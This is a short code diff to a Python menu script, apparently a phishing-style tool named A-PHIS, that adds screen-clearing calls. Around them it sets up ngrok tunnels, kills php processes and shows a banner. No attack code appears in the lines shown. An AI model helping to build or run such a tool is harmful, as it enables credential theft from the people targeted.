@@ -1,4 +1,5 @@
 import os,json,time,sys
+os.system("clear")
 def slowprint(s):
  	  for c in s + '\n':
  	      sys.stdout.write(c)
@@ -14,6 +15,7 @@ cyan  = "\033[96m"
 os.system("chmod +x Abir/ngrok*")
 os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
 os.system("killall php> /dev/null 2>&1")
+os.system("clear")
 os.system("lolcat A-PHIS.py")
 main_opt=str(input(red+"\n[★] Select Your Option : "+yellow))
 
